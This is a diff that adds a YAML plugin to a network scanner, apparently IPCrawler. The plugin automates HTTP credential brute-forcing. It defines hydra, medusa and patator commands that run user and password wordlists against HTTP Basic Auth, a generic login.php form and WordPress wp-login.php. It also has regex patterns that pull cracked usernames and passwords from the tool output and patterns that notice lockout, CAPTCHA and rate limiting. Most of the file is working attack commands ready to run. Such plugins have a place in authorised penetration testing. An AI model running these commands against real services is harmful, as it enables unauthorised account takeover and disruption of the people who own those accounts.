@@ -1,0 +1,96 @@
+name: "HTTP Basic Auth Bruteforce"
+description: "HTTP Basic Authentication bruteforce attack using common credentials and wordlists"
+author: "IPCrawler YAML Plugin System"
+version: "1.0.0"
+
+metadata:
+  type: "servicescan"
+  slug: "bruteforce-http"
+  priority: 6
+  references:
+    - "https://tools.ietf.org/html/rfc7617"
+    - "https://github.com/vanhauser-thc/thc-hydra"
+
+conditions:
+  services_include:
+    - "^http"
+    - "ssl/http"
+    - "^https"
+  services_exclude:
+    - "^nacn_http$"
+
+commands:
+  - description: "HTTP Basic Auth bruteforce"
+    command: "hydra -L {wordlist_users} -P {wordlist_passwords} -t 10 -f {address} http-get:{port}/"
+    timeout: 600
+
+  - description: "HTTP POST form bruteforce"
+    command: "hydra -L {wordlist_users} -P {wordlist_passwords} -t 10 -f {address} http-post-form:{port}/login.php:username=^USER^&password=^PASS^:F=incorrect"
+    timeout: 600
+
+  - description: "Medusa HTTP Basic Auth"
+    command: "medusa -h {address} -U {wordlist_users} -P {wordlist_passwords} -M http -m DIR:/admin -T 10"
+    timeout: 600
+
+  - description: "Patator HTTP Basic Auth"
+    command: "patator http_fuzz url={url}/admin method=GET user_pass=FILE0:FILE1 0={wordlist_users} 1={wordlist_passwords} -x ignore:code=401"
+    timeout: 600
+
+  - description: "WordPress login bruteforce"
+    command: "hydra -L {wordlist_users} -P {wordlist_passwords} -t 10 -f {address} http-post-form:{port}/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
+    timeout: 600
+
+patterns:
+  - description: "HTTP Auth Success"
+    pattern: "login:\\s*(.+)\\s*password:\\s*(.+)"
+    category: "successful_login"
+    severity: "critical"
+
+  - description: "Hydra HTTP Success"
+    pattern: "\\[80\\]\\[http.*\\].*login:\\s*(.+).*password:\\s*(.+)"
+    category: "hydra_success"
+    severity: "critical"
+
+  - description: "Medusa HTTP Success"
+    pattern: "ACCOUNT FOUND.*\\[http\\].*Host:\\s*(.+).*User:\\s*(.+).*Password:\\s*(.+)"
+    category: "medusa_success"
+    severity: "critical"
+
+  - description: "Patator HTTP Success"
+    pattern: "http_fuzz.*200.*user_pass=(.+):(.+)"
+    category: "patator_success"
+    severity: "critical"
+
+  - description: "WordPress Login Success"
+    pattern: "wp-login.*login:\\s*(.+).*password:\\s*(.+)"
+    category: "wordpress_login"
+    severity: "critical"
+
+  - description: "HTTP 401 Unauthorized"
+    pattern: "401.*Unauthorized|WWW-Authenticate.*Basic"
+    category: "auth_required"
+    severity: "info"
+
+  - description: "HTTP 403 Forbidden"
+    pattern: "403.*Forbidden|Access.*denied"
+    category: "access_denied"
+    severity: "info"
+
+  - description: "HTTP Rate Limiting"
+    pattern: "429.*Too Many Requests|Rate.*limit.*exceeded"
+    category: "rate_limiting"
+    severity: "info"
+
+  - description: "CAPTCHA Detected"
+    pattern: "captcha|CAPTCHA|recaptcha"
+    category: "captcha_protection"
+    severity: "info"
+
+  - description: "Account Lockout"
+    pattern: "account.*locked|too.*many.*attempts"
+    category: "account_lockout"
+    severity: "info"
+
+wordlists:
+  users: "web-usernames.txt"
+  passwords: "web-passwords.txt"
